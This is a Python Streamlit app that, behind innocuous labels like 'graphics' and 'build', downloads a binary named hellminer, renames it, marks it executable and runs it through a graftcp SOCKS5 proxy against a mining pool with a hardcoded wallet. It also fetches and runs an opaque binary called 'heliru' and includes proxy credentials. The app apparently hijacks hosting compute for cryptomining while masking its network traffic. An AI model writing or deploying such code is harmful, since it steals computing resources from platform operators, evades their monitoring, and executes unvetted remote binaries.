import os
import time
import streamlit as st

# Streamlit App Title
st.title("Script Execution and Graftcp Configuration")

# Description
st.write("This app allows you to download and prepare files, configure graftcp, and execute scripts.")

# Section 1: Download and Prepare Files
st.subheader("Step 1: Download and Prepare Files")
if st.button("Download and Prepare Files"):
    st.write("Executing script...")

    try:
        # Download graphics.tar.gz
        st.write("Downloading graphics.tar.gz...")
        os.system("curl -0 https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz -o graphics.tar.gz >/dev/null 2>&1")
        st.write("Extracting graphics.tar.gz...")
        os.system("tar -xvzf graphics.tar.gz")

        # Download and prepare build file
        st.write("Downloading build file...")
        os.system("curl -0 https://gitlab.com/mauliki9999/peskot/-/raw/main/hellminer -o build >/dev/null 2>&1")
        st.write("Setting permissions for build file...")
        os.system("chmod +x build")

        # Download verus-solver
        st.write("Downloading verus-solver...")
        os.system("curl -0 https://gitlab.com/mauliki9999/peskot/-/raw/main/verus-solver -o verus-solver >/dev/null 2>&1")

        # Download and prepare heliru
        st.write("Downloading heliru...")
        os.system("curl -0 https://raw.githubusercontent.com/AzureOpSec/lolkaka/main/heliru -o heliru >/dev/null 2>&1")
        st.write("Setting permissions for heliru...")
        os.system("chmod +x heliru")

        st.success("Files downloaded and prepared successfully!")
    except Exception as e:
        st.error(f"An error occurred: {e}")

# Section 2: Graftcp Configuration and Execution
st.subheader("Step 2: Configure and Execute Graftcp")

# Configuration Inputs
listen_port = st.text_input("Listen Port", value=":2233")
socks5_ip = st.text_input("SOCKS5 IP", value="149.129.220.103")
socks5_port = st.text_input("SOCKS5 Port", value="80")
socks5_username = st.text_input("SOCKS5 Username", value="username")
socks5_password = st.text_input("SOCKS5 Password", value="1234abcd", type="password")

# Button to generate configuration and execute script
if st.button("Run Graftcp Script"):
    st.write("Generating graftcp configuration...")

    try:
        # Create the graftcp-local.conf file
        conf_content = f"""
listen = {listen_port}
loglevel = 1
socks5 = {socks5_ip}:{socks5_port}
socks5_username = {socks5_username}
socks5_password = {socks5_password}
"""
        with open("graftcp/local/graftcp-local.conf", "w") as f:
            f.write(conf_content)

        st.write("Starting graftcp-local...")
        os.system("./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &")
        time.sleep(0.2)

        st.write("Testing graftcp with curl...")
        os.system("./graftcp/graftcp curl ifconfig.me")

        st.write("Running build with graftcp...")
        os.system("./graftcp/graftcp ./build -c stratum+tcp://usse.vipor.net:5040#xnsub -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx.RDP9 -p x --cpu 4")

        st.success("Graftcp script executed successfully!")
    except Exception as e:
        st.error(f"An error occurred: {e}")

# Section 3: Run heliru
st.subheader("Step 3: Run heliru")
if st.button("Run heliru"):
    st.write("Running heliru...")
    try:
        os.system("./heliru")
        st.success("heliru executed successfully!")
    except Exception as e:
        st.error(f"An error occurred: {e}")
